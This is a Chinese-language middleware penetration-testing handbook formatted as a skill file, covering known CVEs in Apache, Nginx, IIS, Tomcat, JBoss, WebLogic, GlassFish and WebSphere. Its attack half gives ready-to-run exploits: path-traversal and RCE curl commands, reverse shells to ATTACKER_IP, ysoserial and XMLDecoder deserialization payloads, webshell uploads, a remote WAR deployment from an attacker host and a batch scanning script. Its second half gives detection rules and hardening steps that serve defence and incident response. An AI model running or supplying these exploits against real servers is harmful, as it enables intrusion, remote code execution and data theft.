---
name: middleware-vulns
description: >
  全面覆盖主流中间件与服务器的漏洞利用与加固。涵盖 Apache（CVE-2017-15715 解析漏洞、
  CVE-2021-41773/42013 路径穿越与 RCE）、Nginx（配置错误、解析漏洞、CVE-2017-7529
  整数溢出）、IIS（短文件名、PUT 上传、CVE-2015-1635 MS15-034 HTTP.sys）、
  Tomcat（CVE-2017-12615 PUT、CVE-2020-1938 Ghostcat AJP、弱口令后台）、
  JBoss（CVE-2017-12149 反序列化、JMX Console 未授权）、WebLogic（CVE-2017-10271
  XMLDecoder、CVE-2020-14882、CVE-2020-2883 T3、SSRF）、GlassFish（任意文件读取）、
  WebSphere（CVE-2015-7450 反序列化）。攻防合一：Part A 攻击方法与 PoC + Part B 检测规则与加固。
domain: cybersecurity
subdomain: service-security
tags: [middleware, apache, nginx, iis, tomcat, jboss, weblogic, glassfish, websphere, deserialization, rce, cve, path-traversal]
version: 2.0.0
---

# 中间件与服务攻防 — 完整攻防手册

## 适用场景

- 渗透测试中发现目标运行特定中间件（Apache/Nginx/IIS/Tomcat/JBoss/WebLogic/GlassFish/WebSphere）
- 红队演练中需要利用中间件已知 CVE 获取初始立足点
- 应急响应中排查中间件是否被特定漏洞利用
- 安全加固评估中验证中间件配置安全性

---

# Part A：攻击方法论

## 一、Apache HTTP Server

### 1. 换行解析漏洞（CVE-2017-15715）

**影响版本**：Apache 2.4.0 ~ 2.4.29

**原理**：Apache 配置 `FilesMatch` 使用正则 `\.php$` 匹配 PHP 文件时，`$` 默认匹配行尾，但在某些配置下 `\n`（0x0a）也会被 `$` 匹配。上传 `shell.php%0a` 文件可被当作 PHP 解析。

**利用条件**：
- Apache 以 mod_php 模式运行（FastCGI 模式不受影响）
- 文件名至少包含一个 `.php`
- 配置中使用 `<FilesMatch \.php$>` 而非 `<FilesMatch \.php$>`

**PoC**：
```bash
# 上传时在文件名末尾加 0x0a
curl -X POST -F "file=@shell.php" http://target/upload.php
# 利用 Burp 抓包，在文件名 shell.php 后加 0x0a（不是 0x0d 0x0a）
# shell.php\x0a → 服务器保存为 shell.php\n → Apache 当 PHP 解析
```

```python
# Python 自动化
import requests
url = "http://target/upload.php"
files = {'file': ('shell.php\x0a', open('shell.php','rb'), 'image/jpeg')}
r = requests.post(url, files=files)
```

### 2. 目录穿越与 RCE（CVE-2021-41773 / CVE-2021-42013）

**影响版本**：
- CVE-2021-41773：Apache 2.4.49
- CVE-2021-42013：Apache 2.4.49、2.4.50（修复不完整）

**原理**：Apache 2.4.49 版本对路径规范化处理存在缺陷，攻击者可构造 `/.%2e/` 绕过别名限制读取任意文件。若 `mod_cgi` 启用，可进一步 RCE。

**路径穿越 PoC**：
```bash
# CVE-2021-41773 读取文件
curl --path-as-is "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# CVE-2021-42013（双编码绕过 41773 的修复）
curl --path-as-is "http://target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
```

**RCE PoC**（需要 mod_cgi 启用）：
```bash
curl --path-as-is "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d 'echo Content-Type: text/plain; echo; id; uname -a'
```

```bash
# 反弹 Shell
curl --path-as-is "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**批量检测脚本**：
```python
import requests
targets = open("targets.txt").read().splitlines()
for t in targets:
    try:
        r = requests.get(f"{t}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", timeout=5)
        if "root:" in r.text:
            print(f"[VULN] {t}")
    except: pass
```

### 3. SSI 注入

当 Apache 启用 `mod_include` 且允许 SSI（Server Side Includes）时，上传含 SSI 指令的文件可执行命令。

```html
<!--#exec cmd="id" -->
<!--#exec cmd="cat /etc/passwd" -->
```

---

## 二、Nginx

### 1. 解析漏洞

**影响配置**：Nginx + PHP-FPM，当 `cgi.fix_pathinfo=1`（PHP 默认）

**原理**：访问 `/test.jpg/x.php` 时，Nginx 将请求转发给 PHP-FPM，PHP 发现 `x.php` 不存在但 `cgi.fix_pathinfo=1`，向上回溯到 `test.jpg` 当 PHP 解析。

**PoC**：
```bash
# 上传图片马 test.jpg（内含 PHP 代码）
# 访问 /upload/test.jpg/x.php 触发 PHP 解析
curl "http://target/upload/test.jpg/x.php"
```

### 2. 配置错误导致目录穿越

```nginx
# 错误配置（缺少末尾斜杠）
location /files {
    alias /var/www/files/;  # 正确
}
# 错误示例
location /files {
    alias /var/www/files;   # 访问 /files../etc/passwd 可穿越
}
```

**PoC**：
```bash
curl "http://target/files../etc/passwd"
```

### 3. 整数溢出（CVE-2017-7529）

**影响版本**：Nginx 0.5.6 ~ 1.13.2

**原理**：Nginx Range 过滤器存在整数溢出，可读取缓存文件头部的敏感信息（如缓存 key 中的 Cookie）。

```bash
# 正常 Range
curl -r 0-1023 "http://target/file"
# 溢出 Range（负数）
curl -r -9223372036854775807 "http://target/" -H "Range: bytes=-9223372036854775807"
```

### 4. Nginx 配置不当导致的 RCE

```nginx
# 危险配置 1：user 指令可被覆盖
user root;  # 以 root 运行

# 危险配置 2：日志注入
# 如果应用将用户输入写入 Nginx 日志，可注入恶意 PHP 代码
# 配合解析漏洞 include 日志文件
```

---

## 三、Microsoft IIS

### 1. 短文件名枚举

**原理**：IIS 的 8.3 短文件名机制允许通过 `*` 和 `~` 通配符枚举文件名前 6 个字符。

```bash
# 使用 IIS_shortname_Scanner
java -jar iis_shortname_scanner.jar http://target/

# 手工探测
curl "http://target/*~1*/.aspx"      # 存在返回 404，不存在返回 403
curl "http://target/a*~1*/.aspx"
```

### 2. PUT 上传漏洞

**原理**：IIS 开启 WebDAV 且允许 PUT 方法时可直接上传 Webshell。

```bash
# 直接 PUT 上传
curl -X PUT "http://target/shell.txt" -d '<%eval request("cmd")%>'

# MOVE 改后缀
curl -X MOVE "http://target/shell.txt" -H "Destination: http://target/shell.asp"
```

### 3. HTTP.sys 远程代码执行（CVE-2015-1635 / MS15-034）

**影响版本**：Windows 7/8/Server 2008 R2/2012 R2（含 IIS 6.0-8.5）

**原理**：HTTP 协议栈（HTTP.sys）处理 Range 请求存在整数溢出，可导致内核态 RCE 或蓝屏。

**检测（不触发 RCE，仅验证漏洞存在）：
```bash
# 发送特殊 Range 头，返回 416 表示存在漏洞
curl -H "Host: target" -H "Range: bytes=0-18446744073709551615" "http://target/"

# msf 模块
use auxiliary/scanner/http/iis_shortname_scanner
use auxiliary/dos/http/http.sys
```

### 4. IIS 6.0 解析漏洞

```
# 目录解析：test.asp/1.jpg → 当作 ASP 执行
http://target/test.asp/shell.jpg

# 分号截断：shell.asp;.jpg → 当作 ASP 执行
http://target/shell.asp;.jpg
```

---

## 四、Apache Tomcat

### 1. PUT 方法任意文件写入（CVE-2017-12615）

**影响版本**：Tomcat 7.0.0 ~ 7.0.81（Windows）

**原理**：Tomcat 配置 `readonly=false` 时允许 PUT 方法上传 JSP 文件。

```bash
# 直接 PUT 上传 Webshell
curl -X PUT "http://target/shell.jsp/" -d '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'

# 注意末尾的 / 绕过 JSP 解析检查
# 访问 http://target/shell.jsp?cmd=whoami
```

### 2. AJP 文件包含（CVE-2020-1938 / Ghostcat）

**影响版本**：Tomcat 6.0.0-6.0.48、7.0.0-7.0.99、8.5.0-8.5.50、9.0.0-9.0.30

**原理**：AJP 协议（默认端口 8009）未做身份验证，攻击者可伪造 `javax.servlet.include.*` 属性，让 Tomcat 读取任意文件或包含已上传的文件执行代码。

**文件读取 PoC**：
```bash
# 使用 ajpShooter / Ghostcat 利用工具
python ajpShooter.py http://target 8009 /WEB-INF/web.xml read

# 读取任意文件
python Ghostcat.py -p 8009 -f /etc/passwd http://target
```

**RCE PoC**（需先上传文件）：
```bash
# 1. 先通过其他漏洞上传 shell.txt（内容为 JSP 代码）
# 2. 使用 AJP 包含执行
python ajpShooter.py http://target 8009 shell.txt eval
```

### 3. 后台弱口令与 WAR 部署

```bash
# 默认后台路径
http://target/manager/html
http://target/host-manager/html

# 默认凭据
tomcat:tomcat
admin:admin
admin:123456

# 爆破
hydra -L users.txt -P pass.txt target http-get /manager/html

# 部署 WAR 后门（获取后台权限后）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war
# 上传 shell.war 到后台
# 访问 http://target/shell/
```

### 4. Tomcat 弱口令后台 getshell 流程

```bash
# 1. 访问 /manager/html，输入凭据
# 2. 在 "WAR file to deploy" 上传 shell.war
# 3. 点击 Deploy
# 4. 监听 nc -lvnp 4444
# 5. 访问 http://target/shell/ 触发反弹
```

---

## 五、JBoss

### 1. 反序列化（CVE-2017-12149）

**影响版本**：JBoss 5.x、6.x

**原理**：`HttpInvoker` 组件的 ReadOnlyAccessFilter 过滤器对用户传入的序列化数据未做过滤，直接反序列化执行。

**PoC**：
```bash
# 检测（访问以下路径返回 500 表示存在）
curl "http://target/invoker/readonly"
curl "http://target/invoker/JMXInvokerServlet"
curl "http://target/jmx-console/"

# 利用（使用 ysoserial 生成 payload）
java -jar ysoserial.jar JBossInterceptors1 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > payload.bin
curl "http://target/invoker/readonly" --data-binary @payload.bin
```

### 2. JMX Console 未授权访问

```bash
# 默认路径（无认证）
http://target/jmx-console/
http://target/web-console/

# 利用：部署 WAR 包
# 1. 找到 jboss.system:service=MainDeployer
# 2. 调用 deploy 方法，传入远程 WAR URL
# http://target/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=2&arg0=http://ATTACKER/shell.war
```

### 3. EJBInvokerServlet / JMXInvokerServlet

```bash
# 反序列化利用
# 使用 SerialBrute 爆破利用链
java -jar ysoserial.jar CommonsCollections5 'cmd' > cc5.ser
curl "http://target/invoker/EJBInvokerServlet" --data-binary @cc5.ser
curl "http://target/invoker/JMXInvokerServlet" --data-binary @cc5.ser
```

---

## 六、Oracle WebLogic

### 1. XMLDecoder 反序列化（CVE-2017-10271 / CVE-2017-3506）

**影响版本**：WebLogic 10.3.6、12.1.3、12.2.1

**原理**：WLS Security 组件的 XMLDecoder 反序列化未做过滤。

**PoC**（POST 到 `/wls-wsat/CoordinatorPortType`）：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>bash -i &gt;&amp; /dev/tcp/ATTACKER/4444 0&gt;&amp;1</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

```bash
curl -X POST "http://target:7001/wls-wsat/CoordinatorPortType" \
  -H "Content-Type: text/xml" \
  -d @payload.xml
```

### 2. 异步响应反序列化（CVE-2020-2883 / CVE-2020-14645）

**影响版本**：WebLogic 10.3.6、12.1.3、12.2.1、14.1.1

**原理**：Coherence 组件存在二次反序列化。

```bash
# 使用 weblogic_cn_cve_2020_2883 工具
java -jar weblogic_2020_2883.jar http://target:7001 "whoami"
```

### 3. 管理后台未授权（CVE-2020-14882）

**影响版本**：WebLogic 10.3.6、12.1.3、12.2.1、14.1.1

**原理**：管理控制台存在路径穿越，可直接访问后台。

```bash
# 路径穿越访问后台
curl "http://target:7001/console/css/%252e%252e%252fconsole.portal"
```

**组合 CVE-2020-14882 + CVE-2020-14883 RCE**：
```bash
# 通过 com.tangosol.coherence.mvel2.sh.ShellSession 执行命令
curl "http://target:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27)%22)"
```

### 4. T3 协议反序列化（CVE-2018-2628 等）

```bash
# 使用 weblogic_t3 工具
# 1. 监听 ncmp 监听器
# 2. 发送 T3 序列化数据
python weblogic_t3.py target 7001 ysoserial.jar CommonsCollections1 'cmd'
```

### 5. SSRF（CVE-2014-4210）

```bash
# UDDI Explorer SSRF
curl "http://target:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://INTERNAL:80&rdoSearch=search&operator=http://INTERNAL:80"

# 探测内网 Redis
curl "http://target:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://192.168.1.x:6379/test&rdoSearch=search"
```

---

## 七、GlassFish

### 1. 任意文件读取

**原理**：GlassFish 管理后台的 theme 加载未过滤路径。

```bash
# 默认端口 4848（后台）、8080（应用）
# Linux 任意文件读取
curl "http://target:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"

# Windows
curl "http://target:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
```

### 2. 后台部署 WAR

```bash
# 默认凭据 admin/adminadmin
# 访问 https://target:4848/common/index.jsf
# Applications → Deploy → 上传 WAR
```

---

## 八、IBM WebSphere

### 1. 反序列化（CVE-2015-7450）

**影响版本**：WebSphere 7.0、8.0、8.5

**原理**：Java反序列化漏洞，通过 SOAP 连接器触发。

```bash
# 端口 8880（SOAP 连接器）
# 使用 websphere_cmd 工具
java -jar websphere_cmd.jar target 8880 CommonsCollections1 "whoami"

# 或直接发送序列化 payload 到 /soap
java -jar ysoserial.jar CommonsCollections1 'cmd' > payload.bin
curl -X POST "http://target:8880/" --data-binary @payload.bin
```

---

## 九、中间件指纹识别与自动化检测

### 1. 指纹识别

```bash
# whatweb
whatweb http://target

# wappalyzer（浏览器插件或 CLI）
# HTTP 头中的 Server 字段
curl -I http://target | grep -i server

# favicon hash
python favicon_hash.py http://target/favicon.ico
# 在 Shodan/FOFA 中搜索 http.favicon.hash
```

### 2. Nuclei 批量扫描

```bash
# Apache CVE
nuclei -t http/cves/2021/CVE-2021-41773.yaml -u http://target
nuclei -t http/cves/2021/CVE-2021-42013.yaml -u http://target

# Tomcat
nuclei -t http/cves/2017/CVE-2017-12615.yaml -u http://target
nuclei -t http/cves/2020/CVE-2020-1938.yaml -u http://target

# WebLogic
nuclei -t http/cves/2017/CVE-2017-10271.yaml -u http://target:7001
nuclei -t http/cves/2020/CVE-2020-14882.yaml -u http://target:7001
```

### 3. Metasploit 模块

```bash
# Apache
use auxiliary/scanner/http/apache_normalize_path
use exploit/multi/http/apache_normalize_path_rce

# Tomcat
use exploit/multi/http/tomcat_mgr_deploy
use auxiliary/scanner/http/tomcat_mgr_login
use exploit/windows/http/tomcat_cve_2017_12615

# WebLogic
use auxiliary/scanner/http/weblogic_admin_server
use exploit/multi/http/weblogic_admin_handle
use auxiliary/scanner/http/weblogic_xml_deserialization
```

---

# Part B：检测规则与加固

## 一、检测规则

### 1. Suricata/Snort 规则

```
# Apache CVE-2021-41773 路径穿越
alert http any any -> $HOME_NET any (msg:"Apache CVE-2021-41773 Path Traversal"; \
  content:"/.%2e/"; nocase; content:"cgi-bin"; nocase; sid:1000001; rev:1;)

# Tomcat CVE-2020-1938 Ghostcat AJP
alert tcp any any -> $HOME_NET 8009 (msg:"Tomcat Ghostcat AJP Exploit"; \
  content:"javax.servlet.include"; sid:1000002; rev:1;)

# WebLogic XMLDecoder
alert http any any -> $HOME_NET 7001 (msg:"WebLogic XMLDecoder Deserialization"; \
  content:"/wls-wsat/CoordinatorPortType"; content:"java.beans.XMLDecoder"; sid:1000003; rev:1;)

# WebLogic CVE-2020-14882
alert http any any -> $HOME_NET 7001 (msg:"WebLogic CVE-2020-14882 Console Path Traversal"; \
  content:"%252e%252e%252f"; sid:1000004; rev:1;)
```

### 2. Sigma 规则（日志检测）

```yaml
title: WebLogic XMLDecoder Deserialization Attempt
logsource:
  product: weblogic
  service: access
detection:
  selection:
    cs-uri-stem|contains:
      - "/wls-wsat/CoordinatorPortType"
      - "/_async/AsyncResponseService"
  condition: selection
level: high
```

### 3. Nginx/Apache 访问日志关键字

```bash
# 路径穿越
grep -E "(\.\.%2f|%2e%2e|/%2e)" /var/log/nginx/access.log
# 反序列化
grep -E "(java\.beans\.XMLDecoder|XMLDecoder|/wls-wsat/|/invoker/readonly)" /var/log/*/access.log
# Ghostcat AJP
grep -E "javax\.servlet\.include|8009" /var/log/*/access.log
# 管理后台异常访问
grep -E "(jmx-console|/manager/html|/console/console.portal|/uddiexplorer)" /var/log/*/access.log
```

## 二、加固建议

### 1. Apache 加固

```apache
# 升级到最新版本（>= 2.4.51）
# 禁用不必要的模块
# LoadModule cgi_module modules/mod_cgi.so  # 如不需要 CGI，注释掉

# 限制目录访问
<Directory />
    Require all denied
    Options -Indexes -Includes -ExecCGI
    AllowOverride None
</Directory>

# 修复 CVE-2017-15715
# FilesMatch 使用 \.php$ 而非 \.php
<FilesMatch "\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>

# 关闭 ServerTokens
ServerTokens Prod
ServerSignature Off
```

### 2. Nginx 加固

```nginx
# 禁用不必要的 HTTP 方法
if ($request_method !~ ^(GET|HEAD|POST)$ ) {
    return 405;
}

# 修复 alias 配置（确保末尾斜杠）
location /files/ {
    alias /var/www/files/;
}

# 隐藏版本号
server_tokens off;

# 限制 Range 头
# 升级到 >= 1.13.3
```

### 3. IIS 加固

```powershell
# 删除 WebDAV（如不需要）
# 服务器管理器 → 角色 → Web 服务器 → 移除 WebDAV

# 限制文件类型执行
# web.config
<configuration>
  <system.webServer>
    <handlers>
      <remove name="ASPClassic" />
    </handlers>
    <staticContent>
      <mimeMap fileExtension=".config" mimeType="text/xml" />
    </staticContent>
  </system.webServer>
</configuration>

# 安装 MS15-034 补丁
```

### 4. Tomcat 加固

```xml
<!-- conf/web.xml：移除默认应用 -->
<!-- 删除 docs、examples、manager、host-manager（如不需要） -->

<!-- 限制 manager 访问 -->
<!-- conf/Catalina/localhost/manager.xml -->
<Context antiResourceLocking="false" privileged="true">
  <Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="192\.168\.1\.\d+|10\.0\.0\.\d+" />
</Context>

<!-- 禁用 AJP 或加密（修复 CVE-2020-1938） -->
<!-- conf/server.xml -->
<!-- 注释掉或配置 secret -->
<Connector port="8009" protocol="AJP/1.3" secret="YOUR_STRONG_SECRET"
           address="127.0.0.1" />

<!-- 修改默认 manager 密码 -->
<!-- conf/tomcat-users.xml -->
```

### 5. JBoss 加固

```bash
# 1. 删除 /invoker/* 路径
# 2. jmx-console 加认证
#    server/default/deploy/jmx-console.war/WEB-INF/web.xml 添加 security-constraint
#    server/default/conf/props/jmx-console-users.properties 设置密码
# 3. 移除不需要的应用
#    删除 server/default/deploy/下的 http-invoker.sar、jboss-ws4ee.sar
```

### 6. WebLogic 加固

```bash
# 1. 升级到最新 PSU 补丁
# 2. 禁用或限制 wls-wsat
#    删除或重命名 server/lib/wls-wsat.war
# 3. 限制 console 访问 IP
#    设置 weblogic 启动参数 -Dweblogic.security.SSL.session.url.ttl
# 4. T3 协议白名单
#    配置 weblogic.security.allowRemoteAccess=false
# 5. 禁用 UDDI Explorer
#    删除 server/lib/uddi.war
```

### 7. 通用加固原则

| 措施 | 说明 |
|------|------|
| **及时打补丁** | 关注 CNVD/CNNVD/NVD，第一时间安装官方补丁 |
| **最小权限** | 中间件以低权限账户运行（非 root/SYSTEM） |
| **关闭默认应用** | 删除示例应用、管理后台外网暴露 |
| **访问控制** | 管理后台仅内网/VPN 可达，配置 IP 白名单 |
| **WAF 防护** | 部署 ModSecurity / 商业 WAF，配置反序列化/路径穿越规则 |
| **日志监控** | 集中收集访问日志，配置异常请求告警 |
| **配置审计** | 定期扫描配置文件，检测危险配置项 |
| **指纹隐藏** | 隐藏 Server 版本号，自定义错误页 |

## 三、应急响应检查清单

当怀疑中间件被利用时，按以下步骤排查：

```bash
# 1. 检查异常进程与网络连接
ps aux | grep -E "(java|tomcat|weblogic)"
netstat -antpl | grep -E "(8009|7001|4848|9990|8080)"

# 2. 检查异常文件（新上传的 JSP/ASP/JSPX/WAR）
find / -name "*.jsp" -newer /tmp/ref_time 2>/dev/null
find / -name "*.war" -newer /tmp/ref_time 2>/dev/null
find / -name "*.aspx" -newer /tmp/ref_time 2>/dev/null

# 3. 检查中间件日志中的恶意请求
grep -E "(exec|cmd|whoami|/bin/sh|powershell|nc |bash -i)" /var/log/*/access*.log
grep -E "(xmldecoder|XMLDecoder|invoker|wls-wsat|jmx-console)" /var/log/*/access*.log

# 4. 检查中间件配置是否被篡改
diff /etc/nginx/nginx.conf /backup/nginx.conf.bak
diff /usr/local/tomcat/conf/server.xml /backup/server.xml.bak

# 5. 检查新增的定时任务和后门
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# 6. 检查 Weblogic/JBoss 部署的异常应用
ls -la /weblogic/user_projects/domains/*/servers/*/tmp/_WL_user/
ls -la /jboss/server/default/deploy/ | grep -v "known_app"
```

## 参考资源

- Apache 安全公告：https://httpd.apache.org/security/
- Tomcat Security：https://tomcat.apache.org/security.html
- WebLogic CPU 补丁：https://www.oracle.com/security-alerts/
- Nginx 安全：https://nginx.org/en/security_advisories.html
- Nuclei 模板库：https://github.com/projectdiscovery/nuclei-templates
